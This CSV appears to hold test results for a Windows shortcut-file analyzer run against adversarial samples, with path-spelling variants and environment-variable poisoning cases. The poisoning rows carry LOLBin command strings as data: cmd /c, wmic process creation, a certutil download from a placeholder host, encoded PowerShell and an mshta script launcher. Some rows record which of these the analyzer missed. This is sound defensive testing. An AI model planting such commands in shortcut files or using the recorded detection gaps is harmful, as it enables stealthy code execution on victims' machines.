sample_id,category,variant,construction,ground_truth,system_status,system_detail,system_correct,failure_mode,sha256
ADV_PATH_IDENTITY_dotdot_08,PATH_IDENTITY,dotdot,IDList=mp323.mp3 LinkInfo='dotdot' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,395d0606ad82808e55213187cfcd0bab18c4ce83e334e205d4f0e51d883c44e2
ADV_PATH_IDENTITY_dotdot_09,PATH_IDENTITY,dotdot,IDList=mp333.mp3 LinkInfo='dotdot' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,3da08f4acce992f7fecee6018b2690e641029fd6b02dc3c8f00dfb7db7d234c0
ADV_PATH_IDENTITY_dotdot_10,PATH_IDENTITY,dotdot,IDList=mp415.mp4 LinkInfo='dotdot' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,d2a4961a09478c78fcc39d14c3326ea47804a4b2ee2858908d4565b8c8d7e7dd
ADV_PATH_IDENTITY_dotdot_11,PATH_IDENTITY,dotdot,IDList=mp425.mp4 LinkInfo='dotdot' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,93bfdd6895cc1f0bc1448714b90a90e44712803df06c395e0906cb0a6724e8cb
ADV_PATH_IDENTITY_unc_localhost_00,PATH_IDENTITY,unc_localhost,IDList=docx19.docx LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,9745e859b0aafc906d336a754ca87b8f035916204d6ab4457c298cfa51e18d02
ADV_PATH_IDENTITY_unc_localhost_01,PATH_IDENTITY,unc_localhost,IDList=docx29.docx LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,c61429fc69797b946753c3d51f2bc8dbf5c22e2094a5688ebbebdb2d6168a78b
ADV_PATH_IDENTITY_unc_localhost_02,PATH_IDENTITY,unc_localhost,IDList=docx39.docx LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,cf6e0c3165f89fef52dc7f5e71755e35d8e3fe36683b26b1a1360a7e28ed14cc
ADV_PATH_IDENTITY_unc_localhost_03,PATH_IDENTITY,unc_localhost,IDList=jpg16.jpg LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,c2e1ddf55075c82ce300c23ca8048d8de059078d4cab00ee84cbff96afffd27f
ADV_PATH_IDENTITY_unc_localhost_04,PATH_IDENTITY,unc_localhost,IDList=jpg26.jpg LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,a68799ca102f9beb6afb417d91787e0c04caaeb73a1dc7e49c4836305f83b5e0
ADV_PATH_IDENTITY_unc_localhost_05,PATH_IDENTITY,unc_localhost,IDList=jpg36.jpg LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,910eec46dc05d291c065b927b834789281045906aeb5e339e3ca2604aeeea87f
ADV_PATH_IDENTITY_unc_localhost_06,PATH_IDENTITY,unc_localhost,IDList=jpgf.jpg LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,f5711e67020257c3b670bf9ad79ade42add6d9375d8121ae5fcc0bb4ac23796d
ADV_PATH_IDENTITY_unc_localhost_07,PATH_IDENTITY,unc_localhost,IDList=mp313.mp3 LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,7f29b3ac0329ab6957c310fc504f9296ed5a4cfdbf5b23e319cd7c78444adf17
ADV_PATH_IDENTITY_unc_localhost_08,PATH_IDENTITY,unc_localhost,IDList=mp323.mp3 LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,d3eb065d639900e462bd01a959befccf82e25f130d060213f84f90af56866392
ADV_PATH_IDENTITY_unc_localhost_09,PATH_IDENTITY,unc_localhost,IDList=mp333.mp3 LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,b7e727bad67f5b8f4253b460c89493330dc2c44cec7e7b1cda58502aafecd7cf
ADV_PATH_IDENTITY_unc_localhost_10,PATH_IDENTITY,unc_localhost,IDList=mp415.mp4 LinkInfo='unc_localhost' spelling,CONSISTENT (satu file),CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,67a712b67955d32bba570f86c92dccdeb828d8916c1fc944f237aa2566daac8b
ADV_ENV_POISON_comspec_c_00,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,426d75eb3fdade90258e1c8408d9151089715fb5826561c8e3a95d8ca69563b9
ADV_ENV_POISON_comspec_c_01,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,10b8fad3f7a508222028cfb8aa58cd91cfc7051c3e311a29be896ff81a0f42c5
ADV_ENV_POISON_comspec_c_02,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,d1924e9abf2f2bae497ae135836f7785a4e9c3230db5542797f91b279cc6bb7b
ADV_ENV_POISON_comspec_c_03,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,ad75979381bf7208d49a3bc20e16b323e4e8a715b22c4fafae1226769adce10d
ADV_ENV_POISON_comspec_c_04,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,c62d574e4c422089ba4e7d98676c5ea68e033f524ba61237bb1b22989a6063ae
ADV_ENV_POISON_comspec_c_05,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,db0485a72dda10b81c4c159f49018682bacf0f4bb4b58aad41151552d21f96a9
ADV_ENV_POISON_comspec_c_06,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,b58dffc111ce4108f04b3dcea7784f0b34b765fece72c2b734260f19bed52c3c
ADV_ENV_POISON_comspec_c_07,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,00d101666de273199d2c86d6d2fa0b650a2c34b83b358b4d795bca7cf70b1da0
ADV_ENV_POISON_comspec_c_08,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,e0ab94eeac4196fa3ebdb28914cebb8bdb5c4f3c6176bae091815bc3beb56d33
ADV_ENV_POISON_comspec_c_09,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,36a2bbebbf6f602f8d4d383bc469ba4313c5ef99e399a3d6a4262c4d95de436b
ADV_ENV_POISON_comspec_c_10,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,7223f8b02dba715f2ca6b0743e07994ba2bc0c886f2c23f7065fb8712f84fb1c
ADV_ENV_POISON_comspec_c_11,ENV_POISON,comspec_c,ENV='%COMSPEC% /c calc.exe' (kontrol: ' /c ' harus terdeteksi),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,10675008662fdc8758d23857684f64143cfb430db77b015bbdba378f6946bb39
ADV_ENV_POISON_wmic_00,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",60799aec0d78c1a81ded38be0cd05ecc1a3df4b8455b61bebce6c88c35e30f8d
ADV_ENV_POISON_wmic_01,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",b112d731d87edde4cdb83aa2049a4ceb7bace09839a78383717d6045569aa52d
ADV_ENV_POISON_wmic_02,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",4d0e5f34ca8db0ea8ea5cf7c304d74ed5c7cdbda8b8726931228dc45daf458ce
ADV_ENV_POISON_wmic_03,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",940801f058e7b15c00af96d07ebc82cd0e3c73d9c5a9b34efc00d0efea17b548
ADV_ENV_POISON_wmic_04,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",82135c63f411fc3202eef5c99008675f90b655bcc50e6bd2af338b79599d77d3
ADV_ENV_POISON_wmic_05,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",c9f965f623d4cb5b1e2c1f6a6fd8d36aa4dcb0ed5daa357c0521a996427366fb
ADV_ENV_POISON_wmic_06,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",e56cba1f32d7553ee31fbe8dfbd5cc8c8a587f85745fb8ce4e340d2381206884
ADV_ENV_POISON_wmic_07,ENV_POISON,wmic,ENV='wmic process call create calc.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",9c741b4f981a04f5e897042cd2319bf2face44ede2c4885646883c6ecdb22de4
ADV_ENV_POISON_certutil_00,ENV_POISON,certutil,ENV='certutil -urlcache -f http://x/y z.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",9636c5265e1d2dee3a90a4c14d148ce76ebb424d120a68a6ae4cad1ccc5a2cb4
ADV_ENV_POISON_certutil_01,ENV_POISON,certutil,ENV='certutil -urlcache -f http://x/y z.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",b12b47bc319fa0dbf7ed569c29a2fddeb0c5100f7d2152261c10ca30f218ed9d
ADV_ENV_POISON_certutil_02,ENV_POISON,certutil,ENV='certutil -urlcache -f http://x/y z.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",af6ce3a33d68146a48e2df54c43a584204f6db499f5d78b5ab512582a7895f6e
ADV_ENV_POISON_certutil_03,ENV_POISON,certutil,ENV='certutil -urlcache -f http://x/y z.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",8c2ad1bf62bbba8101f2b801e49d679848a9873961464149fcf26e7afae4c723
ADV_ENV_POISON_certutil_04,ENV_POISON,certutil,ENV='certutil -urlcache -f http://x/y z.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",7726a9852938e6c37177970790f4b8b18a29c35794a555757a6a2287bea8e0b3
ADV_ENV_POISON_certutil_05,ENV_POISON,certutil,ENV='certutil -urlcache -f http://x/y z.exe' (LOLBin tanpa separator),command-like,UNKNOWN,"ui_status=UNKNOWN ui=EnvironmentVariableDataBlock exec=tidak ditemukan class=UNKNOWN tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock', 'LinkTargetIDList']",FALSE,"command tak terdeteksi (state_env=PRESENT_NORMAL_NOT_FOUND, dianggap path)",601a2667a0d8c2be6224111f60d470680a1886bb31423fea111c4b999272b18a
ADV_ENV_POISON_conhost_00,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,4e28d8acdd1c84d2b128bc78bd751d7dbfeb03a12e337b132f175369dc0c0563
ADV_ENV_POISON_conhost_01,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,294663f812ccc336f2ee3b16075c6cc704f56aac713b903aaa4fb2181f4866d5
ADV_ENV_POISON_conhost_02,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,ff3f20de66abb29af185391590451215c9ce023a796e64f17bceab18b95300ad
ADV_ENV_POISON_conhost_03,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,db9712082344fdb0e6e83cb8afa3be6e508c82cdd2b37d5c8c2fe35f44b4723a
ADV_ENV_POISON_conhost_04,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,1b9ba0632f0339925a9ae005fc6df0b63835e61f93f8cbdc4e725326d4331333
ADV_ENV_POISON_conhost_05,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,a488301b1fd5c3666ff5239d65a7dbd44def23e6a0b3bf3ea64ba638f8fb3f9e
ADV_ENV_POISON_conhost_06,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,c110ec570fe47ad5faf930bafa96747690dade90f623504ea067aff08bb1efdc
ADV_ENV_POISON_conhost_07,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,a01e578d67e7298e7a9b4acc28d8df92a62ef1b2cf6d8489bc7ed643a410c345
ADV_ENV_POISON_conhost_08,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,f8ec90ff030d2ba398d0186282307c1fa46ac0a378766127eda5b93691622870
ADV_ENV_POISON_conhost_09,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,e2a1203338dd49359b8946b2974cb78d5e2847ee3020a96a4d104d790520b081
ADV_ENV_POISON_conhost_10,ENV_POISON,conhost,ENV='conhost.exe powershell -enc ABCD' (conhost.exe bukan di daftar 9-exe),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,804087b8dd68abf4060aa54903c56fca4b61d75e76c48992b4a128bbf67cf9c2
ADV_ENV_POISON_mshta_00,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,150e986c9250633638e7137c0e1f6e28301690a5d5da188ad386995a81a24454
ADV_ENV_POISON_mshta_01,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,76e3099c00ff96c402514adc63c949173baccc9fe1782b2f46b382d14f2833d9
ADV_ENV_POISON_mshta_02,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,f90552ed8c18077b3f70e8332779bc50b77efa7a4bdf3cdbc13a3836eac502fa
ADV_ENV_POISON_mshta_03,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,f0a8a719805a906616eeb16218edf4da65342840580a9921e41bcb9a656763cf
ADV_ENV_POISON_mshta_04,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,3a9e12c58dd1839ea584721376e684e49e52dec369baa15b78a4ee9c220fedcd
ADV_ENV_POISON_mshta_05,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,52f3d26350e75d074769b1142e7d513171fd0e04902af43fea17951e46a2ca8a
ADV_ENV_POISON_mshta_06,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,8d416a65d5c4ead5c6de23e20c17fe9d6868d28627e58e90f4b7da70a7474f99
ADV_ENV_POISON_mshta_07,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,77de199d3e2ba81a2363a2e60be7c4f85f80595ad9716d97755b5029d04129e5
ADV_ENV_POISON_mshta_08,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,d33c1ae455104eb6ed6ca09f3cf4aec6be0c7d359ab27a2d98979f786f9d76e3
ADV_ENV_POISON_mshta_09,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,ea45d831a16565f50c9c64e043193c25823cf9224bafa362d3e2b831755fb17f
